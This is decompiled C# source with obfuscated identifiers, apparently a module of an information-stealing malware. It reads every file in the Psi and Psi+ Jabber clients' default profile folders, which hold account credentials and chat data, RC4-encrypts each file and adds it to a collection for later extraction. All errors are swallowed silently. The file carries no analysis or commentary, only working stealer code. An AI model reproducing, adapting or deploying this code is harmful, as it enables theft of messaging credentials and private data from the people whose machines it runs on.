using System;
using System.IO;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x02000063 RID: 99
	internal class Class_76
	{
		// Token: 0x060001CD RID: 461 RVA: 0x0000F6E8 File Offset: 0x0000D8E8
		public static void kmethod_237(string str_0)
		{
			try
			{
				if (!Directory.Exists(Class_76.field_0))
				{
					return;
				}
				foreach (string path in Directory.GetFiles(Class_76.field_0))
				{
					Class_53.\u0347\u0020\u0328\u0020\u0369\u0E47h\u0364\u0358\u036D\u036B\u0324\u0322\u0E47\u031F\u0369qhgddlayjusqyuib\u0353c\u0347\u036Dr\u0020\u0E47\u0356\u0356\u0332\u036D\u0347\u0325\u030E\u0E47\u0356gugwsaxccacjclln.Add(str_0 + "\\Jabber\\Psi+\\" + Path.GetFileName(path), Class_47.RC4(File.ReadAllBytes(path)));
				}
				Class_11.field_0++;
			}
			catch
			{
			}
			try
			{
				if (Directory.Exists(Class_76.field_1))
				{
					foreach (string path2 in Directory.GetFiles(Class_76.field_1))
					{
						Class_53.\u0347\u0020\u0328\u0020\u0369\u0E47h\u0364\u0358\u036D\u036B\u0324\u0322\u0E47\u031F\u0369qhgddlayjusqyuib\u0353c\u0347\u036Dr\u0020\u0E47\u0356\u0356\u0332\u036D\u0347\u0325\u030E\u0E47\u0356gugwsaxccacjclln.Add(str_0 + "\\Jabber\\Psi\\" + Path.GetFileName(path2), Class_47.RC4(File.ReadAllBytes(path2)));
					}
					Class_11.field_0++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000129 RID: 297
		public static string field_0 = Class_47.\u030A\u0330\u0314\u0E47\u036D\u0020\u0331\u036B\u0310\u0341\u0353\u0333\u035F\u0368\u0333\u0369fscvyixozutspogr\u0316\u0020\u0E47\u0340\u0020\u0325\u035A\u0342\u032F\u0366\u0303\u036D\u0344\u0302\u0338\u032Cmiwjanndutheeold + "\\Psi+\\profiles\\default\\";

		// Token: 0x0400012A RID: 298
		public static string field_1 = Class_47.\u030A\u0330\u0314\u0E47\u036D\u0020\u0331\u036B\u0310\u0341\u0353\u0333\u035F\u0368\u0333\u0369fscvyixozutspogr\u0316\u0020\u0E47\u0340\u0020\u0325\u035A\u0342\u032F\u0366\u0303\u036D\u0344\u0302\u0338\u032Cmiwjanndutheeold + "\\Psi\\profiles\\default\\";
	}
}
